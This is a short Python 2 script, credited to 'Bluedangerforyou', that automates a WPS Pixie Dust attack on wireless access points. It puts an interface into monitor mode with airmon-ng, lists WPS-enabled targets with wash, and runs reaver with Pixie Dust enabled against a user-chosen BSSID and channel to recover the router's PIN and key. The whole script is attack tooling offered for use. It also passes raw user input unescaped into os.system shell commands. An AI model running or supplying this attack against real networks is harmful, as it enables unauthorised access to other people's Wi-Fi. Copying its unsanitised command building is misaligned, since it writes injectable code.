import os
import subprocess
os.system('clear')

def collect():
	os.system('clear')
	print """

Auto Lazy Pixie Attack
Script to automate WPS Pixie attack
Bluedangerforyou

"""
	os.system('ifconfig > wlan.txt')
	file = open('wlan.txt','r')
	if 'wlan0' in open('wlan.txt').read():
		interface = 'wlan0'
		file.close()
	else:
		interface = raw_input("What is your wireless interface? example wlan1: ")
	os.system('rm wlan.txt')		
	washcommand = "\'wash " + "-i " + interface + "mon\' --full-screen"
	print '...running kill check on interface...'
	os.system('airmon-ng check kill')
	print '...putting ' + interface + ' into monitor mode...'
	os.system('airmon-ng start ' + interface)
	os.system("gnome-terminal -e " + washcommand)
	os.system('clear')
	print 'A new terminal is opening. Pick a WPS enabled AP'
	BSSID = raw_input("Paste the BSSID>> ")
	channel = raw_input("What channel is AP?>> ")
	print 'Running WPS Pixie reaver attack...'
	os.system('reaver -i ' + interface + 'mon -b ' + BSSID + ' -c ' + channel + ' -vvv -K 1 -f')
	raw_input("Press enter to exit")
collect()

